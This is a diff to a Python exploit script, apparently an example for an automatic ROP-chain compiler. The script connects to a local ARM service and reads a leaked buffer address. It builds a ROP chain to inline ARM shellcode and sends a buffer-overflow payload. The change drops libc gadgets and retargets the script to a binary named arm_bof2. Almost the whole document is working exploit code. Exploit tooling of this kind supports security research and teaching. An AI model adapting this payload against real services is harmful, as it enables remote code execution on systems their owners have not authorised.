@@ -3,13 +3,10 @@ import archinfo
 from pwn import *
 from rop_compiler import ropme
 
-filename = './example/arm_bof_nogadgets'
-libc, libc_gadget_file = ('./example/arm_libc.so.6', './example/arm_libc.gadgets')
+filename = './arm_bof2'
 p = remote('localhost', 2222)
 
-mprotect_address = 0xcade0
 buffer_address = struct.unpack("<I", p.read(4))[0]
-libc_address = struct.unpack("<I", p.read(4))[0] - mprotect_address
 
 shellcode = (
     "\x01\x30\x8f\xe2" # add r3, pc, #1  ; 0x1
@@ -29,7 +26,7 @@ target_address = buffer_address + 700
 print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
 print "Using automatically built ROP chain"
-rop = ropme.rop_to_shellcode([(filename, None, 0), (libc, libc_gadget_file, libc_address)], [libc], target_address, archinfo.ArchARM(), logging.DEBUG)
+rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchARM(), logging.DEBUG)
 
 payload = 'A'*512 + 'B'*4 + rop
 payload += ((700 - len(payload)) * 'B') + shellcode
